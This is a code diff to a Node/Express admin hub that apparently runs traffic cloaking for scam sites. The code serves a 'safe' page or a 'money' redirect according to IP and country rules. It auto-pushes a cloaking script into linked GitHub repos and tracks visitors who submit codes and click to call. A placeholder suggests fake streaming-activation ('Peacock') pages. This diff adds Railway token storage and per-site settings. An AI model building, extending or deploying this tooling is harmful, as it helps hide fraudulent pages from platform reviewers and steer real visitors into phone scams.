@@ -15,6 +15,7 @@ const SETTINGS_FILE = path.join(__dirname, 'data', 'settings.json');
 const LOGS_FILE     = path.join(__dirname, 'data', 'logs.json');
 const LEADS_FILE    = path.join(__dirname, 'data', 'leads.json');
 const SITES_FILE    = path.join(__dirname, 'data', 'sites.json');
+const CONFIG_FILE   = path.join(__dirname, 'data', 'config.json');
 const MAX_LOG_ENTRIES  = 10000;
 const MAX_LEAD_ENTRIES = 5000;
 
@@ -26,6 +27,16 @@ function readSettings() {
   try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch (e) {
     return { moneyUrl: '', safeUrl: '/safe', enabled: true, blockedIps: [], allowedCountries: [] };
   }
+}
+
+function readConfig() {
+  try { return JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); } catch (e) { return {}; }
+}
+function writeConfig(data) {
+  fs.writeFileSync(CONFIG_FILE, JSON.stringify(data, null, 2));
+}
+function getRailwayToken() {
+  return process.env.RAILWAY_API_TOKEN || readConfig().railwayToken || '';
 }
 
 function writeSettings(data) {
@@ -57,13 +68,13 @@ function appendLead(entry) {
   logEmitter.emit('newLead', entry);
 }
 
-function markLeadCalled(ip, code) {
+function markLeadCalled(siteId, ip, code) {
   var leads = readLeads();
   var cutoff = Date.now() - 30 * 60 * 1000;
   var found = false;
   for (var i = 0; i < leads.length; i++) {
     var l = leads[i];
-    if (l.type === 'code_submit' && l.ip === ip && new Date(l.ts).getTime() > cutoff) {
+    if (l.type === 'code_submit' && l.siteId === siteId && l.ip === ip && new Date(l.ts).getTime() > cutoff) {
       leads[i].called = true;
       leads[i].calledAt = new Date().toISOString();
       found = true;
@@ -71,7 +82,7 @@ function markLeadCalled(ip, code) {
     }
   }
   if (!found) {
-    leads.unshift({ type: 'call_click', ts: new Date().toISOString(), ip: ip, code: code || '', called: true });
+    leads.unshift({ type: 'call_click', ts: new Date().toISOString(), siteId: siteId, ip: ip, code: code || '', called: true });
     if (leads.length > MAX_LEAD_ENTRIES) leads = leads.slice(0, MAX_LEAD_ENTRIES);
   }
   fs.writeFileSync(LEADS_FILE, JSON.stringify(leads, null, 2));
@@ -114,8 +125,9 @@ function getSiteSettings(apiKey) {
     safeUrl:          site.safeUrl  || global.safeUrl  || '/safe',
     // Default site's enabled state is managed via settings.json (admin toggle)
     enabled:          site.isDefault ? (global.enabled !== false) : (site.enabled !== false),
-    blockedIps:       site.blockedIps && site.blockedIps.length ? site.blockedIps : (global.blockedIps || []),
-    allowedCountries: site.allowedCountries && site.allowedCountries.length ? site.allowedCountries : (global.allowedCountries || [])
+    // Non-default sites have fully independent settings; empty arrays = no restriction (not a global fallback)
+    blockedIps:       site.isDefault ? (global.blockedIps || []) : (Array.isArray(site.blockedIps) ? site.blockedIps : []),
+    allowedCountries: site.isDefault ? (global.allowedCountries || []) : (Array.isArray(site.allowedCountries) ? site.allowedCountries : [])
   };
 }
 
@@ -259,7 +271,7 @@ async function githubInject(site, hubUrl) {
 }
 
 async function railwayDeploy(site) {
-  var token = process.env.RAILWAY_API_TOKEN;
+  var token = getRailwayToken();
   if (!token || !site.railwayProjectId || !site.railwayServiceId) return null;
   try {
     // Step 1: get latest deployment ID
@@ -293,7 +305,7 @@ async function railwayDeploy(site) {
 }
 
 async function getRailwayStatus(site) {
-  var token = process.env.RAILWAY_API_TOKEN;
+  var token = getRailwayToken();
   if (!token || !site.railwayProjectId || !site.railwayServiceId) return null;
   try {
     var query = JSON.stringify({
@@ -614,7 +626,7 @@ app.post('/api/track/lead', async function(req, res) {
     var code = (req.body.code || '').slice(0, 20).toUpperCase();
 
     if (type === 'call_click') {
-      markLeadCalled(realIP, code);
+      markLeadCalled(siteId, realIP, code);
       return;
     }
 
@@ -751,7 +763,7 @@ app.get('/admin', requireAdmin, function(req, res) {
     hubUrl: hubUrl,
     siteCreated: siteCreated,
     hasGithubToken: !!process.env.GITHUB_TOKEN,
-    hasRailwayToken: !!process.env.RAILWAY_API_TOKEN,
+    hasRailwayToken: !!getRailwayToken(),
     displayTz: req.session.displayTz || 'UTC'
   }));
 });
@@ -791,6 +803,19 @@ app.post('/admin/settings', requireAdmin, function(req, res) {
   settings.safeUrl  = (req.body.safeUrl  || '/safe').trim();
   writeSettings(settings);
   res.redirect('/admin');
+});
+
+// ─── Railway token setup (stored in data/config.json, shadowed by env var) ───
+app.post('/admin/settings/railway-token', requireAdmin, function(req, res) {
+  var token = (req.body.railwayToken || '').trim();
+  var cfg = readConfig();
+  if (token) {
+    cfg.railwayToken = token;
+  } else {
+    delete cfg.railwayToken;
+  }
+  writeConfig(cfg);
+  res.redirect('/admin#settings');
 });
 
 // ─── Admin toggle cloaking ────────────────────────────────────────────────────
@@ -1145,7 +1170,7 @@ function mapRailwayStatus(raw) {
 }
 
 async function pollRailwayStatuses() {
-  if (!process.env.RAILWAY_API_TOKEN) return;
+  if (!getRailwayToken()) return;
   var sites = readSites();
   var changed = false;
   for (var i = 0; i < sites.length; i++) {
@@ -1443,24 +1468,6 @@ function adminDashboardPage(settings, logs, leads, opts) {
     return '<option value="' + escHtml(s.id) + '"' + sel + '>' + escHtml(s.name) + (s.isDefault ? ' (default)' : '') + '</option>';
   }).join('');
 
-  var siteBarHtml = '<div class="site-bar">'
-    + '<label for="siteSelector">Viewing:</label>'
-    + '<select class="site-select" id="siteSelector" onchange="window.location=\'/admin\'+(this.value?\'?site=\'+this.value:\'\')">'
-    + '<option value=""' + (!siteFilter ? ' selected' : '') + '>All Sites</option>'
-    + siteOptions
-    + '</select>'
-    + (siteFilter ? '<span class="site-filter-badge">Filtered to: ' + escHtml((selectedSite ? selectedSite.name : siteFilter)) + '</span>' : '')
-    + (siteCreated ? '<span class="site-created-flash">&#10003; Site created! Script is being pushed to GitHub&hellip;</span>' : '')
-    + (!hasGithubToken ? '<span style="font-size:0.72rem;color:#f87171">&#9888; GITHUB_TOKEN not set — auto-inject disabled</span>' : '')
-    + '</div>';
-
-  // ── Sites management card ─────────────────────────────────────────────────
-  function deployBadge(status) {
-    var cls = { live:'db-live', pushed:'db-pushed', pending:'db-pending', failed:'db-failed', 'key-rotated':'db-rotated' }[status] || 'db-pending';
-    var label = { live:'Live', pushed:'Pushed to GitHub', pending:'Pending', failed:'Failed', 'key-rotated':'Key Rotated' }[status] || (status || 'Unknown');
-    return '<span class="deploy-badge ' + cls + '">' + escHtml(label) + '</span>';
-  }
-
   function siteSnippet(s) {
     if (!s.apiKey) return '';
     var safeHref = s.safeUrl || hubUrl + '/sites/' + s.id + '/safe';
@@ -1489,115 +1496,6 @@ function adminDashboardPage(settings, logs, leads, opts) {
       + '<!-- StreamFix-Hub-End -->';
     return snip;
   }
-
-  var nonDefaultSites = sites.filter(function(s) { return !s.isDefault; });
-
-  var siteRowsHtml = nonDefaultSites.map(function(s, idx) {
-    var safeHref = hubUrl + '/sites/' + s.id + '/safe';
-    var moneyHref = hubUrl + '/sites/' + s.id + '/money';
-    var snippet = siteSnippet(s);
-    var snippetId = 'snip-' + escHtml(s.id);
-    var panelId = 'panel-' + escHtml(s.id);
-    var maskedKey = s.apiKey ? s.apiKey.slice(0, 8) + '••••••••-••••-••••-••••-••••••••' + s.apiKey.slice(-4) : '—';
-    var lastPushed = s.lastPushed ? ' · Pushed ' + s.lastPushed.replace('T', ' ').slice(0, 16) + ' UTC' : '';
-    var injected = (s.injectedFiles && s.injectedFiles.length) ? ' · Files: ' + escHtml(s.injectedFiles.join(', ')) : '';
-
-    return '<div class="site-row">'
-      + '<div class="site-row-hdr">'
-      +   '<span class="site-name">' + escHtml(s.name) + '</span>'
-      +   '<span class="site-domain">' + escHtml(s.domain || '') + '</span>'
-      +   deployBadge(s.deployStatus || 'pending')
-      +   '<span style="font-size:0.68rem;color:#444">' + escHtml(lastPushed + injected) + '</span>'
-      +   (s.enabled === false ? '<span class="rpill rpill-grey" style="margin-left:auto">DISABLED</span>' : '<span class="rpill rpill-green" style="margin-left:auto">ACTIVE</span>')
-      + '</div>'
-
-      + '<div class="site-key-wrap">'
-      +   '<span class="site-key-val" id="keyval-' + escHtml(s.id) + '" title="' + escHtml(s.apiKey || '') + '">' + escHtml(maskedKey) + '</span>'
-      +   '<button class="copy-btn" onclick="copyKey(\'keyval-' + escHtml(s.id) + '\',\'' + escHtml(s.apiKey || '') + '\',this)">Copy Key</button>'
-      + '</div>'
-
-      + '<div class="site-urls">'
-      +   '<span class="site-url-chip">Safe page: <a href="' + escHtml(safeHref) + '" target="_blank">' + escHtml(safeHref) + '</a></span>'
-      +   '<span class="site-url-chip">Money redirect: <a href="' + escHtml(moneyHref) + '" target="_blank">' + escHtml(moneyHref) + '</a></span>'
-      + '</div>'
-
-      + '<div class="snippet-wrap">'
-      +   '<button class="snippet-toggle" onclick="toggleSnippet(\'' + snippetId + '\',this)">&lt;/&gt; Show integration script &mdash; paste this in your site\'s &lt;head&gt;</button>'
-      +   '<div class="snippet-box" id="' + snippetId + '">'
-      +     '<button class="snippet-copy" onclick="copySnippet(\'' + snippetId + '\',this)">Copy</button>'
-      +     escHtml(snippet)
-      +   '</div>'
-      + '</div>'
-
-      + '<div class="site-actions">'
-      +   '<button class="site-details-toggle" onclick="togglePanel(\'' + panelId + '\',this)">&#9881; Settings</button>'
-      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/toggle" class="inline">'
-      +     '<button type="submit" class="' + (s.enabled !== false ? 'btn-danger' : 'btn-success') + ' btn-sm">' + (s.enabled !== false ? 'Pause Site' : 'Resume Site') + '</button>'
-      +   '</form>'
-      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/regenerate-key" class="inline" onsubmit="return confirm(\'Regenerate API key? The old key stops working immediately. A new script will be pushed to GitHub.\')">'
-      +     '<button type="submit" class="btn-sm" style="background:#1e1a3a;border:1px solid #7c3aed;color:#a78bfa">&#8635; New Key</button>'
-      +   '</form>'
-      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/delete" class="inline" onsubmit="return confirm(\'Delete site ' + escHtml(s.name) + '? This cannot be undone.\')">'
-      +     '<button type="submit" class="btn-danger btn-sm">Delete</button>'
-      +   '</form>'
-      +   '<a href="/admin?site=' + escHtml(s.id) + '" class="btn-sm" style="display:inline-block;padding:6px 13px;background:#0d0018;border:1px solid #2e1655;border-radius:8px;color:#888;font-size:0.78rem;text-decoration:none">Filter Logs</a>'
-      + '</div>'
-
-      + '<div class="site-settings-panel" id="' + panelId + '">'
-      +   '<form method="POST" action="/admin/sites/' + escHtml(s.id) + '/settings">'
-      +     '<div class="form-grid2">'
-      +       '<div><label>Site Name</label><input type="text" name="name" value="' + escHtml(s.name || '') + '"></div>'
-      +       '<div><label>Domain</label><input type="text" name="domain" value="' + escHtml(s.domain || '') + '" placeholder="example.com"></div>'
-      +     '</div>'
-      +     '<div class="form-grid2" style="margin-top:10px">'
-      +       '<div><label>Money URL</label><input type="text" name="moneyUrl" value="' + escHtml(s.moneyUrl || '') + '" placeholder="https://your-offer-page.com"></div>'
-      +       '<div><label>Safe URL <span style="color:#555">(defaults to hub-hosted)</span></label><input type="text" name="safeUrl" value="' + escHtml(s.safeUrl || '') + '" placeholder="' + escHtml(safeHref) + '"></div>'
-      +     '</div>'
-      +     '<div class="form-grid2" style="margin-top:10px">'
-      +       '<div><label>GitHub Repo URL</label><input type="text" name="githubRepo" value="' + escHtml(s.githubRepo || '') + '" placeholder="https://github.com/user/repo"></div>'
-      +       '<div><label>Allowed Countries <span style="color:#555">(blank = all)</span></label><input type="text" name="allowedCountries" value="' + escHtml((s.allowedCountries || []).join(', ')) + '" placeholder="US CA GB"></div>'
-      +     '</div>'
-      +     '<div class="form-grid2" style="margin-top:10px">'
-      +       '<div><label>Railway Project ID <span style="color:#555">(optional)</span></label><input type="text" name="railwayProjectId" value="' + escHtml(s.railwayProjectId || '') + '" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"></div>'
-      +       '<div><label>Railway Service ID <span style="color:#555">(optional)</span></label><input type="text" name="railwayServiceId" value="' + escHtml(s.railwayServiceId || '') + '" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"></div>'
-      +     '</div>'
-      +     '<div style="margin-top:10px">'
-      +       '<label>Permanently Blocked IPs (one per line)</label>'
-      +       '<textarea name="blockedIps" rows="3">' + escHtml((s.blockedIps || []).join('\n')) + '</textarea>'
-      +     '</div>'
-      +     '<button type="submit" class="btn-primary" style="margin-top:12px;width:100%">Save &amp; Push to GitHub</button>'
-      +   '</form>'
-      + '</div>'
-      + '</div>';
-  }).join('');
-
-  var sitesCardHtml = '<div class="card" style="margin-bottom:18px">'
-    + '<h2>Connected Sites (' + sites.length + ')</h2>'
-
-    + (!hasGithubToken ? '<div style="background:#2d0808;border:1px solid #7f1d1d;border-radius:8px;padding:12px;margin-bottom:14px;font-size:0.78rem;color:#fca5a5">'
-      + '<strong>GitHub token not configured.</strong> Auto-inject and auto-deploy are disabled. '
-      + 'Set the <code>GITHUB_TOKEN</code> secret (a GitHub Personal Access Token with <code>repo</code> scope) to enable them. '
-      + 'You can still add sites and use the manual script snippet.'
-      + '</div>' : '')
-
-    + siteRowsHtml
-
-    + '<div style="border-top:1px solid #1f1035;margin-top:14px;padding-top:14px">'
-    + '<p style="font-size:0.78rem;color:#a78bfa;font-weight:700;margin-bottom:10px">&#43; Add New Site</p>'
-    + '<form method="POST" action="/admin/sites">'
-    +   '<div class="form-grid2">'
-    +     '<div><label>Site Name *</label><input type="text" name="name" placeholder="My Peacock Site" required></div>'
-    +     '<div><label>Domain</label><input type="text" name="domain" placeholder="mypeacocksite.com"></div>'
-    +   '</div>'
-    +   '<div class="form-grid2" style="margin-top:10px">'
-    +     '<div><label>GitHub Repo URL</label><input type="text" name="githubRepo" placeholder="https://github.com/user/repo"></div>'
-    +     '<div><label>Money URL</label><input type="text" name="moneyUrl" placeholder="https://your-offer-page.com"></div>'
-    +   '</div>'
-    +   '<p class="hint" style="margin-top:8px">When you click Add Site: an API key is generated, safe &amp; money pages are created on this hub, and the cloaking script is automatically pushed to your GitHub repo (if token is set and repo is provided).</p>'
-    +   '<button type="submit" class="btn-primary" style="margin-top:12px">Add Site &rarr;</button>'
-    + '</form>'
-    + '</div>'
-    + '</div>';
 
   // ── Hourly traffic chart data ────────────────────────────────────────────
   var hourlyAllow  = new Array(24).fill(0);
@@ -2406,10 +2304,18 @@ textarea{resize:vertical;min-height:80px}
             <div class="f-card-title">Railway Integration</div>
             <div class="flex-gap8 mb12">
               ${hasRailwayToken
-                ? '<span class="db-live">● Connected</span><span class="hint">RAILWAY_API_TOKEN is set — deploy monitoring enabled</span>'
-                : '<span class="db-pending">○ Not connected</span><span class="hint" style="color:var(--amber)">Set RAILWAY_API_TOKEN to monitor deployments</span>'}
+                ? '<span class="db-live">● Connected</span><span class="hint">Railway API token is set — deploy monitoring and auto-redeploy enabled</span>'
+                : '<span class="db-pending">○ Not connected</span><span class="hint" style="color:var(--amber)">Enter your Railway API token below to enable deploy monitoring</span>'}
             </div>
-            <p class="hint">Set your Railway API token as the <strong>RAILWAY_API_TOKEN</strong> environment secret. Add Railway Project ID and Service ID to each site to monitor deployment status in real-time.</p>
+            <p class="hint mb12">Your Railway API token allows FILTER to trigger redeployments and monitor live deploy status. It is stored securely on this server and never exposed to the browser. You can also set it via the <code>RAILWAY_API_TOKEN</code> environment secret (takes priority).</p>
+            <form method="POST" action="/admin/settings/railway-token">
+              <div class="form-row" style="gap:8px;align-items:center">
+                <input type="password" name="railwayToken" placeholder="${hasRailwayToken ? '••••••••••••••••' : 'Paste Railway API token here…'}" style="flex:1;background:#0d0018;border:1px solid #2e1655;color:#e2d9ff;padding:8px 12px;border-radius:8px;font-size:0.85rem">
+                <button type="submit" class="btn-primary" style="padding:8px 18px;font-size:0.85rem">Save Token</button>
+                ${hasRailwayToken ? '<button type="submit" name="railwayToken" value="" class="btn-sm" style="background:#1a0030;border:1px solid #7f1d1d;color:#f87171;padding:8px 12px;border-radius:8px;font-size:0.78rem">Clear</button>' : ''}
+              </div>
+            </form>
+            <p class="hint" style="margin-top:8px">After saving the token, add the <strong>Railway Project ID</strong> and <strong>Railway Service ID</strong> to each site in the Sites tab.</p>
           </div>
         </div>
 
